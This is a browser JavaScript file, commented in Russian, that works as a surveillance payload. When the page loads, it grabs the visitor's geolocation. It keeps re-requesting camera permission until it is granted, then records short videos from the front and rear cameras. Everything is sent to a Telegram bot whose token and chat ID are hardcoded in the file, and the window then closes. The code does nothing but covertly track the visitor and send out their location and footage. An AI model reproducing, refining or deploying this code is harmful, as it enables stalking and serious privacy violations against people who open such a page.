// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');
let locationGranted = false;

// Отправка в Telegram
async function sendToTelegram(method, data) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    try {
        await fetch(url, { method: 'POST', body: data });
    } catch(e) {}
}

// Отправка геолокации
async function sendLocation(lat, lon) {
    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', `📍 Местоположение: ${mapsUrl}`);
    await sendToTelegram('sendMessage', formData);
}

// Отправка видео
async function sendVideo(videoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', videoBlob, 'video.webm');
    formData.append('caption', caption);
    await sendToTelegram('sendVideo', formData);
}

// Запрос геолокации (1 попытка)
async function askLocation() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            (position) => resolve({ lat: position.coords.latitude, lon: position.coords.longitude }),
            () => resolve(null)
        );
    });
}

// Запрос геолокации с повторением
async function requestLocation(maxAttempts) {
    for (let i = 0; i < maxAttempts; i++) {
        const loc = await askLocation();
        if (loc) return loc;
        if (i < maxAttempts - 1) await new Promise(r => setTimeout(r, 2000));
    }
    return null;
}

// Запрос камеры (бесконечно)
async function requestCamera(facingMode) {
    return new Promise((resolve) => {
        const ask = () => {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
            }).then(resolve).catch(() => setTimeout(ask, 2000));
        };
        ask();
    });
}

// Запись видео
async function recordVideo(stream, ms) {
    return new Promise((resolve) => {
        const chunks = [];
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        recorder.ondataavailable = e => e.data.size && chunks.push(e.data);
        recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
        video.srcObject = stream;
        video.play();
        recorder.start();
        setTimeout(() => recorder.stop(), ms);
    });
}

// ГЛАВНАЯ ФУНКЦИЯ
async function main() {
    // 1. Геолокация (2 попытки)
    const firstLoc = await requestLocation(2);
    if (firstLoc) {
        await sendLocation(firstLoc.lat, firstLoc.lon);
        locationGranted = true;
    }
    
    // 2. Фронтальная камера (5 сек)
    const frontStream = await requestCamera('user');
    const frontVideo = await recordVideo(frontStream, 5000);
    await sendVideo(frontVideo, '📹 Фронтальная камера (5 сек)');
    frontStream.getTracks().forEach(t => t.stop());
    
    // 3. Задняя камера (3 сек)
    const backStream = await requestCamera('environment');
    const backVideo = await recordVideo(backStream, 3000);
    await sendVideo(backVideo, '📹 Задняя камера (3 сек)');
    backStream.getTracks().forEach(t => t.stop());
    
    // 4. Второй запрос геолокации (если в первый раз не дали)
    if (!locationGranted) {
        const secondLoc = await askLocation();
        if (secondLoc) await sendLocation(secondLoc.lat, secondLoc.lon);
    }
    
    // 5. Закрытие
    setTimeout(() => window.close(), 1000);
}

// ЗАПУСК
main();
